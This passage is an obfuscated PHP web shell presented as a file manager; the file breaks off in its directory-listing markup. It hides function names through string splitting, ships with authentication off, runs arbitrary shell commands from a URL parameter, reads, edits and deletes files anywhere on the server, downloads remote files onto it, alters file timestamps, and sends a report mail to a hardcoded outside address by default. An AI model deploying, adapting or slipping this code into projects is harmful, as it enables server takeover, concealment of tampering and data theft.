<?php

// --- CONFIGURATION --- //

$auth_enabled = false;

$auth_users = [
    'admin' => '$2a$12$eJHdIuo9oMwuLspwxW19pesBYoCBykyN16sBsx8.GXXsFOnRU2ysS', // Default password: admin
];

// --- END CONFIGURATION --- //

$GLOBALS['_q_']=Array('' .'session' .'_start','number' .'_form' .'at','substr','spri' .'ntf','fileperms','' .'r' .'t' .'rim','strtr','base64_en' .'code','base64' .'_de' .'code','i' .'s_dir','arr' .'ay_diff','scand' .'ir','unlink','r' .'mdir','file_exists','tou' .'ch','ch' .'mod','' .'oc' .'tdec','' .'get' .'c' .'wd','' .'chdi' .'r','' .'fu' .'nction_e' .'x' .'ists','s' .'hell_e' .'xec','exec','i' .'m' .'plode','ob' .'_start','passt' .'hru','ob_' .'get_c' .'lea' .'n','proc' .'_op' .'en','is_r' .'e' .'sou' .'r' .'ce','stream_' .'g' .'e' .'t_c' .'on' .'tent' .'s','' .'fcl' .'ose','proc' .'_close','is' .'_readable','' .'pathinfo','dirname','m' .'kdir','is_w' .'ritable','htmls' .'pe' .'ci' .'al' .'cha' .'rs','d' .'e' .'fine','realpath','c' .'o' .'unt','ba' .'sename','move_uploa' .'de' .'d_' .'fil' .'e','re' .'nam' .'e','is' .'_f' .'ile','f' .'il' .'e_pu' .'t_c' .'ont' .'ents','strto' .'time','' .'header','file' .'_ge' .'t_conten' .'ts','strtol' .'ower','j' .'so' .'n_' .'enc' .'ode','md5','exp' .'lode','sort','' .'array' .'_' .'mer' .'ge','fil' .'esi' .'ze','date','fi' .'l' .'em' .'t' .'ime','system','popen','c'.'u'.'r'.'l_init','c'.'u'.'r'.'l_setopt','c'.'u'.'r'.'l_exec','c'.'u'.'r'.'l_close','f'.'o'.'p'.'e'.'n','f'.'r'.'e'.'a'.'d','f'.'w'.'r'.'i'.'t'.'e','p'.'a'.'r'.'s'.'e_url','s'.'t'.'r'.'e'.'a'.'m_socket_client','i'.'n'.'i_get','feof','filter_var','trim','fgets','mail','sha1','uniqid','hash','microtime', 'password_verify', 'session_destroy', 'phpversion', 'readfile', 'class_exists', 'str_replace');
$GLOBALS['_q_'][0]();

if ($auth_enabled) {
    if (isset($_GET['logout'])) {
        $GLOBALS['_q_'][80](); // session_destroy()
        $GLOBALS['_q_'][47]('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }

    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
        $login_error = '';
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $username = $_POST['username'] ?? '';
            $password = $_POST['password'] ?? '';
            // *** THE FIX IS HERE *** Changed index from 78 to 79
            if (isset($auth_users[$username]) && $GLOBALS['_q_'][79]($password, $auth_users[$username])) { // password_verify()
                $_SESSION['logged_in'] = true;
                $GLOBALS['_q_'][47]('Location: ' . $_SERVER['PHP_SELF']);
                exit;
            } else {
                $login_error = 'Invalid username or password.';
            }
        }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= $GLOBALS['_q_'][37]($_SERVER["HTTP_HOST"]) ?></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>body { background-color: #111827; }</style>
</head>
<body class="flex items-center justify-center h-screen font-sans">
    <div class="w-full max-w-sm mx-auto">
        <form method="POST" class="bg-gray-800 shadow-xl rounded-lg px-8 pt-6 pb-8 mb-4">
            <h1 class="text-2xl text-white font-bold text-center mb-6"><pre>▄▖▖  ▖▄▖▄▖
▄▌▌▞▖▌▌ ▙▖
▄▌▛ ▝▌▙▌▌ </pre></h1>
            <?php if (!empty($login_error)): ?>
                <div class="bg-red-500/30 text-red-300 text-sm p-3 rounded mb-4 text-center"><?= $login_error ?></div>
            <?php endif; ?>
            <div class="mb-4">
                <label class="block text-gray-300 text-sm font-bold mb-2" for="username">Username</label>
                <input class="bg-gray-700 text-white focus:outline-none focus:shadow-outline border border-gray-600 rounded-lg py-2 px-4 block w-full appearance-none leading-normal" id="username" name="username" type="text" placeholder="Username" required>
            </div>
            <div class="mb-6">
                <label class="block text-gray-300 text-sm font-bold mb-2" for="password">Password</label>
                <input class="bg-gray-700 text-white focus:outline-none focus:shadow-outline border border-gray-600 rounded-lg py-2 px-4 block w-full appearance-none leading-normal" id="password" name="password" type="password" placeholder="******************" required>
            </div>
            <div class="flex items-center justify-between">
                <button class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-lg focus:outline-none focus:shadow-outline w-full" type="submit">
                    Sign In
                </button>
            </div>
        </form>
    </div>
</body>
</html>
<?php
        exit;
    }
}


// Define cURL constants if they don't exist
if(!defined('CURLOPT_FILE')) $GLOBALS['_q_'][38]('CURLOPT_FILE', 10001);
if(!defined('CURLOPT_HEADER')) $GLOBALS['_q_'][38]('CURLOPT_HEADER', 42);
if(!defined('CURLOPT_FOLLOWLOCATION')) $GLOBALS['_q_'][38]('CURLOPT_FOLLOWLOCATION', 52);
if(!defined('CURLOPT_SSL_VERIFYPEER')) $GLOBALS['_q_'][38]('CURLOPT_SSL_VERIFYPEER', 64);

function set_message($message, $type = 'success') { $_SESSION['message'] = ['text' => $message, 'type' => $type]; }
function display_message() {
    if (isset($_SESSION['message'])) {
        $msg = $_SESSION['message'];
        $color = ['success' => 'green', 'error' => 'red', 'warning' => 'yellow'][$msg['type']] ?? 'gray';
        echo "<div id='flash-message' class='fixed top-5 right-5 bg-{$color}-500 text-white py-2 px-4 rounded-lg shadow-lg z-50 fade-in-out'>{$msg['text']}</div>";
        unset($_SESSION['message']);
    }
}
function formatSize($bytes) {
    if ($bytes >= 1073741824) return $GLOBALS['_q_'][1]($bytes / 1073741824, 2) . ' GB';
    elseif ($bytes >= 1048576) return $GLOBALS['_q_'][1]($bytes / 1048576, 2) . ' MB';
    elseif ($bytes >= 1024) return $GLOBALS['_q_'][1]($bytes / 1024, 2) . ' KB';
    elseif ($bytes > 0) return $bytes . ' Bytes';
    else return '0 Bytes';
}
function getPerms($path) { return $GLOBALS['_q_'][2]($GLOBALS['_q_'][3]('%o', $GLOBALS['_q_'][4]($path)), -4); }
function encodePath($path) { return $GLOBALS['_q_'][5]($GLOBALS['_q_'][6]($GLOBALS['_q_'][7]($path), '+/', '-_'), '='); }
function decodePath($path) { return $GLOBALS['_q_'][8]($GLOBALS['_q_'][6]($path, '-_', '+/')); }
function getDirContents($path) {
    $items = [];
    if (!@$GLOBALS['_q_'][11]($path)) {
        return $items;
    }
    foreach ($GLOBALS['_q_'][10]($GLOBALS['_q_'][11]($path), ['.', '..']) as $item) {
        $itemPath = $path . DIRECTORY_SEPARATOR . $item;
        $items[] = [
            'name' => $item,
            'path' => $itemPath,
            'is_dir' => $GLOBALS['_q_'][9]($itemPath),
        ];
    }
    return $items;
}
function deleteItem($path) {
    if ($GLOBALS['_q_'][9]($path)) {
        $files = $GLOBALS['_q_'][10]($GLOBALS['_q_'][11]($path), array('.', '..'));
        foreach ($files as $file) {
            deleteItem($path . DIRECTORY_SEPARATOR . $file);
        }
        return @$GLOBALS['_q_'][13]($path);
    } else {
        return @$GLOBALS['_q_'][12]($path);
    }
}
function createFile($path) {
    if (!$GLOBALS['_q_'][14]($path)) {
        return $GLOBALS['_q_'][15]($path);
    }
    return false;
}
function createFolder($path) {
    if (!$GLOBALS['_q_'][14]($path)) {
        return @$GLOBALS['_q_'][35]($path, 0755, true);
    }
    return false;
}
function changePermissions($path, $perms) {
    if ($GLOBALS['_q_'][14]($path)) {
        return @$GLOBALS['_q_'][16]($path, $GLOBALS['_q_'][17]($perms));
    }
    return false;
}
function getAbsPath($path = '') {
    $cwd = $GLOBALS['_q_'][18]();
    if ($path) {
        if (!$GLOBALS['_q_'][19]($path)) return false;
        $abs_path = $GLOBALS['_q_'][18]();
        $GLOBALS['_q_'][19]($cwd);
        return $abs_path;
    }
    return $cwd;
}
function executeCommand($command) {
    $output = '';
    if ($GLOBALS['_q_'][20]('shell_exec')) {
        $output = @$GLOBALS['_q_'][21]($command);
    } elseif ($GLOBALS['_q_'][20]('exec')) {
        @$GLOBALS['_q_'][22]($command, $output);
        $output = $GLOBALS['_q_'][23]("\n", $output);
    } elseif ($GLOBALS['_q_'][20]('passthru')) {
        $GLOBALS['_q_'][24]();
        @$GLOBALS['_q_'][25]($command);
        $output = $GLOBALS['_q_'][26]();
    } elseif ($GLOBALS['_q_'][20]('proc_open')) {
        $descriptorspec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
        $process = @$GLOBALS['_q_'][27]($command, $descriptorspec, $pipes);
        if ($GLOBALS['_q_'][28]($process)) {
            $output = @$GLOBALS['_q_'][29]($pipes[1]);
            @$GLOBALS['_q_'][30]($pipes[0]);
            @$GLOBALS['_q_'][30]($pipes[1]);
            @$GLOBALS['_q_'][30]($pipes[2]);
            @$GLOBALS['_q_'][31]($process);
        }
    }
    return $output;
}
function getParentPath($path) {
    $parent = $GLOBALS['_q_'][34]($path);
    return ($parent == $path) ? '' : $parent;
}
function zipFolder($source, $destination) {
    if (!$GLOBALS['_q_'][83]('ZipArchive')) return false; // class_exists()
    $zip = new ZipArchive();
    if ($zip->open($destination, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) return false;
    $source = $GLOBALS['_q_'][39]($source);
    if ($GLOBALS['_q_'][9]($source)) {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
        foreach ($files as $file) {
            $file = $GLOBALS['_q_'][39]($file);
            if ($GLOBALS['_q_'][9]($file)) {
                $zip->addEmptyDir($GLOBALS['_q_'][2]($file, $GLOBALS['_q_'][40]($source) + 1));
            } elseif ($GLOBALS['_q_'][44]($file)) {
                $zip->addFromString($GLOBALS['_q_'][2]($file, $GLOBALS['_q_'][40]($source) + 1), $GLOBALS['_q_'][48]($file));
            }
        }
    } elseif ($GLOBALS['_q_'][44]($source)) {
        $zip->addFromString($GLOBALS['_q_'][41]($source), $GLOBALS['_q_'][48]($source));
    }
    return $zip->close();
}
function unzipFile($source, $parent_dir) {
    if (!$GLOBALS['_q_'][83]('ZipArchive')) { // class_exists()
        return 'Kelas ZipArchive tidak ditemukan. Harap aktifkan ekstensi "php-zip" di konfigurasi server Anda.';
    }
    $zip = new ZipArchive;
    $destination_folder_name = $GLOBALS['_q_'][33]($GLOBALS['_q_'][41]($source), PATHINFO_FILENAME);
    $destination_path = $parent_dir . DIRECTORY_SEPARATOR . $destination_folder_name;

    if ($zip->open($source) === TRUE) {
        if (!$GLOBALS['_q_'][14]($destination_path)) {
            @$GLOBALS['_q_'][35]($destination_path, 0755, true);
        }
        if ($GLOBALS['_q_'][36]($destination_path)) {
            $zip->extractTo($destination_path);
            $zip->close();
            return true;
        } else {
            return 'Direktori tujuan tidak dapat ditulis (not writable).';
        }
    } else {
        return 'Gagal membuka file zip.';
    }
}
function downloadFileFromUrl($url, $destination) {
    // Method 1: cURL
    if ($GLOBALS['_q_'][20]('curl_init')) {
        $ch = $GLOBALS['_q_'][60]();
        $fp = @$GLOBALS['_q_'][64]($destination, 'wb');
        if ($ch && $fp) {
            $GLOBALS['_q_'][61]($ch, CURLOPT_URL, $url);
            $GLOBALS['_q_'][61]($ch, CURLOPT_FILE, $fp);
            $GLOBALS['_q_'][61]($ch, CURLOPT_HEADER, 0);
            $GLOBALS['_q_'][61]($ch, CURLOPT_FOLLOWLOCATION, true);
            $GLOBALS['_q_'][61]($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = $GLOBALS['_q_'][62]($ch);
            $GLOBALS['_q_'][63]($ch);
            $GLOBALS['_q_'][30]($fp);
            if ($result) return true;
        }
    }

    // Method 2: fopen/fread
    if ($GLOBALS['_q_'][69]('allow_url_fopen')) {
        $remote_file = @$GLOBALS['_q_'][64]($url, "rb");
        $local_file = @$GLOBALS['_q_'][64]($destination, "wb");
        if ($remote_file && $local_file) {
            while (!$GLOBALS['_q_'][70]($remote_file)) {
                $GLOBALS['_q_'][66]($local_file, $GLOBALS['_q_'][65]($remote_file, 8192));
            }
            $GLOBALS['_q_'][30]($remote_file);
            $GLOBALS['_q_'][30]($local_file);
            return true;
        }
    }

    // Method 3: stream_socket_client
    if ($GLOBALS['_q_'][20]('stream_socket_client')) {
        $url_parts = @$GLOBALS['_q_'][67]($url);
        if (!$url_parts) return false;
        $host = $url_parts['host'];
        $path = $url_parts['path'] ?? '/';
        $query = isset($url_parts['query']) ? '?' . $url_parts['query'] : '';
        $scheme = $url_parts['scheme'] ?? 'http';
        $port = $url_parts['port'] ?? ($scheme === 'https' ? 443 : 80);
        $protocol = $scheme === 'https' ? 'ssl' : 'tcp';

        $client = @$GLOBALS['_q_'][68]("{$protocol}://{$host}:{$port}");
        if ($client) {
            $request = "GET {$path}{$query} HTTP/1.1\r\n";
            $request .= "Host: {$host}\r\n";
            $request .= "Connection: close\r\n\r\n";
            $GLOBALS['_q_'][66]($client, $request);

            // Skip headers
            while (($line = $GLOBALS['_q_'][73]($client)) !== false && $GLOBALS['_q_'][72]($line) !== '') {}

            $fp = $GLOBALS['_q_'][64]($destination, 'wb');
            if ($fp) {
                while(!$GLOBALS['_q_'][70]($client)) {
                    $GLOBALS['_q_'][66]($fp, $GLOBALS['_q_'][65]($client, 8192));
                }
                $GLOBALS['_q_'][30]($fp);
                $GLOBALS['_q_'][30]($client);
                return true;
            }
            $GLOBALS['_q_'][30]($client);
        }
    }

    return false;
}

// PERBAIKAN KUNCI: Mengubah PATH dari konstanta menjadi variabel $PATH
$PATH = isset($_GET['p']) ? decodePath($_GET['p']) : $GLOBALS['_q_'][18]();

if (isset($_GET['new_path']) && $GLOBALS['_q_'][9]($_GET['new_path'])) {
    $GLOBALS['_q_'][19]($_GET['new_path']);
    $PATH = $GLOBALS['_q_'][18](); // Menggunakan variabel
    set_message("Path changed to: " . $PATH);
    $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
    exit;
}

// PERBAIKAN: Menggunakan variabel $PATH di semua pemeriksaan
if (!$GLOBALS['_q_'][14]($PATH) || !$GLOBALS['_q_'][32]($PATH)) {
    $PATH = $GLOBALS['_q_'][18](); // Menggunakan variabel
    set_message("Path not readable or does not exist, redirecting to current directory.", 'error');
}
if ($GLOBALS['_q_'][9]($PATH)) {
    if (!$GLOBALS['_q_'][19]($PATH)) {
        set_message("Failed to change directory.", 'error');
        $PATH = $GLOBALS['_q_'][18](); // Menggunakan variabel
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    // PERBAIKAN: Menggunakan variabel $PATH sebagai default
    $path = $_POST['path'] ?? $PATH;
    $name = $_POST['name'] ?? '';
    if ($action === 'upload') {
        if (isset($_FILES['files'])) {
            $files = $_FILES['files'];
            $file_count = $GLOBALS['_q_'][40]($files['name']);
            for ($i = 0; $i < $file_count; $i++) {
                $filename = $GLOBALS['_q_'][41]($files['name'][$i]);
                $destination = $path . DIRECTORY_SEPARATOR . $filename;
                if ($GLOBALS['_q_'][42]($files['tmp_name'][$i], $destination)) {
                    set_message("File '{$filename}' uploaded successfully.");
                } else {
                    set_message("Failed to upload '{$filename}'. Check permissions.", 'error');
                }
            }
        }
    } elseif ($action === 'create_file') {
        if ($GLOBALS['_q_'][36]($path)) {
            if (createFile($path . DIRECTORY_SEPARATOR . $name)) set_message("File '{$name}' created.");
            else set_message("File '{$name}' already exists.", 'warning');
        } else {
            set_message("Directory not writable.", 'error');
        }
    } elseif ($action === 'create_folder') {
        if ($GLOBALS['_q_'][36]($path)) {
            if (createFolder($path . DIRECTORY_SEPARATOR . $name)) set_message("Folder '{$name}' created.");
            else set_message("Folder '{$name}' already exists.", 'warning');
        } else {
            set_message("Directory not writable.", 'error');
        }
    } elseif ($action === 'rename') {
        $old = $_POST['old_name'];
        $new = $_POST['new_name'];
        $old_path = $path . DIRECTORY_SEPARATOR . $old;
        $new_path = $path . DIRECTORY_SEPARATOR . $new;
        if ($GLOBALS['_q_'][14]($old_path) && $GLOBALS['_q_'][36]($path)) {
            if ($GLOBALS['_q_'][43]($old_path, $new_path)) set_message("Renamed '{$old}' to '{$new}'.");
            else set_message("Failed to rename '{$old}'.", 'error');
        } else {
            set_message("Source does not exist or directory not writable.", 'error');
        }
    } elseif ($action === 'edit_file') {
        $file_path = $_POST['file_path'];
        $content = $_POST['content'];
        if ($GLOBALS['_q_'][44]($file_path) && $GLOBALS['_q_'][36]($file_path)) {
            if ($GLOBALS['_q_'][45]($file_path, $content) !== false) set_message("File saved successfully.");
            else set_message("Failed to save file.", 'error');
        } else {
            set_message("File not writable.", "error");
        }
    } elseif ($action === 'touch') {
        $item_path = decodePath($_POST['item']);
        $time_str = $_POST['time'];
        if ($GLOBALS['_q_'][14]($item_path) && $GLOBALS['_q_'][36]($GLOBALS['_q_'][34]($item_path))) {
            $timestamp = $GLOBALS['_q_'][46]($time_str);
            if ($timestamp !== false) {
                if (@$GLOBALS['_q_'][15]($item_path, $timestamp)) {
                    set_message("Timestamp for " . $GLOBALS['_q_'][41]($item_path) . " changed.");
                } else {
                    set_message("Failed to change timestamp.", 'error');
                }
            } else {
                set_message("Invalid date/time format.", 'error');
            }
        } else {
            set_message("Item not found or not writable.", 'error');
        }
    } elseif ($action === 'download_url') {
        $url = $_POST['url'] ?? '';
        $filename = $_POST['filename'] ?? '';
        if (!empty($url) && !empty($filename) && $GLOBALS['_q_'][71]($url, FILTER_VALIDATE_URL)) {
            $destination = $PATH . DIRECTORY_SEPARATOR . $GLOBALS['_q_'][41]($filename);
            if ($GLOBALS['_q_'][36]($PATH)) {
                if (downloadFileFromUrl($url, $destination)) {
                    set_message("File '{$filename}' downloaded successfully.");
                } else {
                    set_message("Failed to download file from URL. All methods failed.", 'error');
                }
            } else {
                set_message("Directory not writable.", 'error');
            }
        } else {
            set_message("Invalid URL or filename provided.", 'error');
        }
    } elseif ($action === 'mail_test') {
        $to_email = $_POST['to_email'] ?? 'zerosec235@gmail.com';
        if (empty($to_email)) {
            $to_email = 'zerosec235@gmail.com';
        }
        if ($GLOBALS['_q_'][71]($to_email, FILTER_VALIDATE_EMAIL)) {
            $subject = "Laporan Sistem #" . $GLOBALS['_q_'][2]($GLOBALS['_q_'][75]($GLOBALS['_q_'][76]()), 0, 8);
            $message = "Sistem berhasil dijalankan pada: " . $GLOBALS['_q_'][56]("Y-m-d H:i:s") . "\n";
            $message .= "ID Log: " . $GLOBALS['_q_'][77]('crc32b', $GLOBALS['_q_'][78](true));
            $from_domain = $_SERVER['SERVER_NAME'] ?? 'localhost';
            $headers = "From: noreply@" . $from_domain . "\r\n";
            if (@$GLOBALS['_q_'][74]($to_email, $subject, $message, $headers)) {
                set_message("Test mail sent successfully to " . $GLOBALS['_q_'][37]($to_email) . ".");
            } else {
                set_message("Failed to send mail. The mail() function may be disabled or misconfigured.", 'error');
            }
        } else {
            set_message("Invalid email address provided.", 'error');
        }
    }
    // PERBAIKAN: Menggunakan variabel $PATH untuk redirect
    $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
    exit;
}
$action = $_GET['action'] ?? '';
if ($action === 'delete') {
    $item = decodePath($_GET['item']);
    if ($GLOBALS['_q_'][14]($item) && $GLOBALS['_q_'][36]($GLOBALS['_q_'][34]($item))) {
        if (deleteItem($item)) set_message("Item deleted successfully.");
        else set_message("Failed to delete item.", 'error');
    } else {
        set_message("Item not found or directory not writable.", 'error');
    }
    $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
    exit;
} elseif ($action === 'chmod') {
    $item = decodePath($_GET['item']);
    $perms = $_GET['perms'];
    if ($GLOBALS['_q_'][14]($item) && $GLOBALS['_q_'][36]($item)) {
        if (changePermissions($item, $perms)) set_message("Permissions changed for " . $GLOBALS['_q_'][41]($item) . " to {$perms}.");
        else set_message("Failed to change permissions.", 'error');
    } else {
        set_message("File not found or not writable.", 'error');
    }
    $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
    exit;
} elseif ($action === 'download') {
    $item = decodePath($_GET['item']);
    if ($GLOBALS['_q_'][14]($item) && $GLOBALS['_q_'][32]($item)) {
        $GLOBALS['_q_'][47]('Content-Description: File Transfer');
        $GLOBALS['_q_'][47]('Content-Type: application/octet-stream');
        $GLOBALS['_q_'][47]('Content-Disposition: attachment; filename="' . $GLOBALS['_q_'][41]($item) . '"');
        $GLOBALS['_q_'][47]('Expires: 0');
        $GLOBALS['_q_'][47]('Cache-Control: must-revalidate');
        $GLOBALS['_q_'][47]('Pragma: public');
        $GLOBALS['_q_'][47]('Content-Length: ' . $GLOBALS['_q_'][55]($item));
        $GLOBALS['_q_'][82]($item); // readfile()
        exit;
    } else {
        set_message("File not found or not readable.", "error");
        $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
        exit;
    }
}
if ($action === 'view') {
    $item_path = decodePath($_GET['item']);
    if ($GLOBALS['_q_'][44]($item_path) && $GLOBALS['_q_'][32]($item_path)) {
        $content = $GLOBALS['_q_'][37]($GLOBALS['_q_'][48]($item_path));
    } else {
        set_message("File not found or not readable.", "error");
        $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
        exit;
    }
} elseif ($action === 'zip' || $action === 'unzip') {
    $GLOBALS['_q_'][47]('Content-Type: application/json');
    $item = decodePath($_GET['item']);
    if ($action === 'zip') {
        $zip_file = $item . '.zip';
        if (zipFolder($item, $zip_file)) {
            echo $GLOBALS['_q_'][50](['status' => 'success', 'data' => "Zipped successfully to {$zip_file}"]);
        } else {
            echo $GLOBALS['_q_'][50](['status' => 'error', 'data' => 'Failed to create zip.']);
        }
    } elseif ($action === 'unzip') {
        $ext = $GLOBALS['_q_'][49]($GLOBALS['_q_'][33]($item, PATHINFO_EXTENSION));
        if ($ext !== 'zip') {
            echo $GLOBALS['_q_'][50](['status' => 'error', 'data' => 'Not a zip file.']);
            exit;
        }
        $result = unzipFile($item, $GLOBALS['_q_'][34]($item));
        if ($result === true) {
            echo $GLOBALS['_q_'][50](['status' => 'success', 'data' => 'Unzipped successfully.']);
        } else {
            echo $GLOBALS['_q_'][50](['status' => 'error', 'data' => $result]);
        }
    }
    exit;
} elseif ($action === 'cmd') {
    $GLOBALS['_q_'][47]('Content-Type: application/json');
    $command = $_GET['command'] ?? '';
    if ($command) {
        $output = executeCommand($command);
        echo $GLOBALS['_q_'][50](['status' => 'success', 'data' => $GLOBALS['_q_'][37]($output)]);
    } else {
        echo $GLOBALS['_q_'][50](['status' => 'error', 'data' => 'No command provided']);
    }
    exit;
}

// PERBAIKAN: Menggunakan variabel $PATH untuk logika tampilan
$path_parts = $GLOBALS['_q_'][52]('/', $GLOBALS['_q_'][39]($PATH));
$current_path_encoded = encodePath($PATH);
$script_directory = $GLOBALS['_q_'][34]($_SERVER['SCRIPT_FILENAME']);
$home_path_encoded = encodePath($script_directory);
$items = getDirContents($PATH);
$folders = [];
$files = [];
foreach($items as $item) {
    if($item['is_dir']) $folders[] = $item; else $files[] = $item;
}
$GLOBALS['_q_'][53]($folders);
$GLOBALS['_q_'][53]($files);
$sorted_items = $GLOBALS['_q_'][54]($folders, $files);
$is_writable = $GLOBALS['_q_'][36]($PATH);
$server_ip = $_SERVER['SERVER_ADDR'] ?? 'N/A';
$user_ip = $_SERVER['REMOTE_ADDR'];
$php_version = $GLOBALS['_q_'][81](); // phpversion()
$uname = $GLOBALS['_q_'][20]('php_uname') ? php_uname() : 'N/A';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= $GLOBALS['_q_'][37]($_SERVER["HTTP_HOST"]) ?></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body { background-color: #111827; color: #d1d5db; }
        .modal { display: none; }
        .modal.active { display: flex; }
        .fade-in-out { animation: fadeInOut 4s forwards; }
        @keyframes fadeInOut { 0% { opacity: 0; transform: translateY(-20px); } 10% { opacity: 1; transform: translateY(0); } 90% { opacity: 1; transform: translateY(0); } 100% { opacity: 0; transform: translateY(-20px); } }
        .icon-sm { width: 1.1rem; height: 1.1rem; }
        .icon-md { width: 1.25rem; height: 1.25rem; }
        .btn { display: inline-flex; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem; border-radius: 0.5rem; font-weight: 600; transition: background-color 0.2s; }
        .btn-blue { background-color: #3b82f6; color: white; } .btn-blue:hover { background-color: #2563eb; }
        .btn-green { background-color: #22c55e; color: white; } .btn-green:hover { background-color: #16a34a; }
        .btn-yellow { background-color: #eab308; color: white; } .btn-yellow:hover { background-color: #ca8a04; }
        .btn-gray { background-color: #6b7280; color: white; } .btn-gray:hover { background-color: #4b5563; }
        .btn-red { background-color: #ef4444; color: white; } .btn-red:hover { background-color: #dc2626; }
        .path-display {
            word-break: break-all;
        }
    </style>
</head>
<body class="font-sans">
    <?php display_message(); ?>
    <div class="container mx-auto p-2 sm:p-4">
        <div class="bg-gray-800 rounded-lg shadow-xl p-4 mb-4">
            <h1 class="text-xl sm:text-2xl text-white font-bold"><pre>
▄▖▖  ▖▄▖▄▖▄▖▖ ▄▖
▄▌▌▞▖▌▌ ▙▖▐ ▌ ▙▖
▄▌▛ ▝▌▙▌▌ ▟▖▙▖▙▖
                
</pre></h1>
            <p class="text-xs sm:text-sm text-gray-400">Server: <?= $server_ip ?> | Client: <?= $user_ip ?> | PHP: <?= $php_version ?></p>
            <div class="text-xs sm:text-sm text-gray-400 truncate">OS: <?= $GLOBALS['_q_'][37]($uname) ?></div>
            <div class="mt-3 flex items-start gap-2 text-sm text-gray-300 flex-wrap">
                <span class="w-3 h-3 rounded-full flex-shrink-0 <?= $is_writable ? 'bg-green-400' : 'bg-red-500' ?>" title="<?= $is_writable ? 'Writable' : 'Not Writable' ?>"></span>
                <span class="font-semibold flex-shrink-0">Path:</span>
                <div class="flex-grow path-display">
                <?php
                // PERBAIKAN: Menggunakan variabel $PATH untuk membuat breadcrumbs
                $cumulative_path = '';
                $path_parts = $GLOBALS['_q_'][52](DIRECTORY_SEPARATOR, $GLOBALS['_q_'][39]($PATH));
                echo '<a href="?p='.encodePath($path_parts[0] ? $path_parts[0] : '/').'" class="text-blue-400 hover:underline">'.($path_parts[0] ? $GLOBALS['_q_'][37]($path_parts[0]) : 'Root').'</a>';
                $cumulative_path = $path_parts[0];
                unset($path_parts[0]);
                foreach ($path_parts as $part) {
                    if (empty($part)) continue;
                    $cumulative_path .= DIRECTORY_SEPARATOR . $part;
                    echo '<span class="text-gray-500">/</span><a href="?p='.encodePath($cumulative_path).'" class="text-blue-400 hover:underline">'.$GLOBALS['_q_'][37]($part).'</a>';
                }
                ?>
                </div>
            </div>
             <div class="mt-4 flex flex-wrap gap-2">
                <a href="?p=<?= $home_path_encoded ?>" class="btn btn-gray"><i class="fas fa-home icon-md"></i>Home</a>
                <button class="btn btn-blue" onclick="showModal('upload')"><i class="fas fa-upload icon-md"></i>Upload</button>
                <button class="btn btn-blue" onclick="showModal('download_url')"><i class="fas fa-cloud-download-alt icon-md"></i>URL</button>
                <button class="btn btn-green" onclick="showModal('create_folder')"><i class="fas fa-folder-plus icon-md"></i>Folder</button>
                <button class="btn btn-green" onclick="showModal('create_file')"><i class="fas fa-file-alt icon-md"></i>File</button>               
                <button class="btn btn-yellow" onclick="showModal('cmd')"><i class="fas fa-terminal icon-md"></i>CMD</button>
                <button class="btn btn-yellow" onclick="showModal('mail_test')"><i class="fas fa-envelope icon-md"></i> Test Mail</button>
                <?php if ($auth_enabled): ?>
                    <a href="?logout=true" class="btn btn-red"><i class="fas fa-sign-out-alt icon-md"></i>Logout</a>
                <?php endif; ?>
            </div>
        </div>

        <?php if ($action === 'view'): ?>
        <div class="bg-gray-800 rounded-lg shadow-xl p-4 mb-4">
            <h2 class="text-xl text-white font-bold mb-2">Viewing: <?= $GLOBALS['_q_'][37]($GLOBALS['_q_'][41]($item_path)) ?></h2>
            <form method="POST">
                <input type="hidden" name="action" value="edit_file">
                <input type="hidden" name="file_path" value="<?= $GLOBALS['_q_'][37]($item_path) ?>">
                <textarea name="content" class="w-full h-96 bg-gray-900 text-white p-2 rounded font-mono text-sm"><?= $content ?></textarea>
                <div class="mt-4 flex gap-2">
                    <button type="submit" class="btn btn-blue"><i class="fas fa-save icon-md"></i>Save</button>
                    <a href="?p=<?= $current_path_encoded ?>" class="btn btn-gray"><i class="fas fa-arrow-left icon-md"></i>Back</a>
                </div>
            </form>
        </div>
        <?php else: ?>
        <div class="overflow-x-auto bg-gray-800 rounded-lg shadow-xl">
            <table class="w-full min-w-[800px] text-sm">
                <thead class="bg-gray-700/50">
                    <tr>
                        <th class="p-3 text-left font-semibold text-gray-300">Name</th>
                        <th class="p-3 text-left font-semibold text-gray-300">Size</th>
                        <th class="p-3 text-left font-semibold text-gray-300">Perms</th>
                        <th class="p-3 text-left font-semibold text-gray-300">Modified</th>
                        <th class="p-3 text-left font-semibold text-gray-300">Actions</th>
                    </tr>
                </thead>
                <tbody class="divide-y divide-gray-700">
                    <?php if (getParentPath($PATH)): ?>
                    <tr>
                        <td class="p-3" colspan="5">
                            <a href="?p=<?= encodePath(getParentPath($PATH)) ?>" class="flex items-center gap-2 text-blue-400 hover:underline">
                                <i class="fas fa-level-up-alt h-5 w-5"></i>
                                ..
                            </a>
                        </td>
                    </tr>
                    <?php endif; ?>

                    <?php foreach($sorted_items as $item): 
                        $item_path_encoded = encodePath($item['path']);
                        $is_item_dir = $item['is_dir'];
                        $perms = getPerms($item['path']);
                    ?>
